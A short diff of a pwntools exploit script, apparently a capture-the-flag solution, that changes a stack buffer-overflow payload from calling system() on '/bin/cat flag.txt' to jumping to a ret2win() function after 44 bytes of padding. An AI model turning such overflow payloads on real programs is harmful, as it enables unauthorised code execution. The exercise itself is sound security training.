@@ -17,8 +17,8 @@ else:
 
 p.recvuntil("> ")
 
-# 44 A's, system, 4 byte junk as expected ret addr, addr of "/bin/cat flag.txt"
-payload = b"A" * 44 + pwn.pack(elf.sym["system"]) + b"AAAA" + pwn.pack(0x08048813)
+# 44 byte junk, replace esp with ret2win()
+payload = b"A" * 44 + pwn.pack(elf.sym['ret2win'])
 p.sendline(payload)
 
 
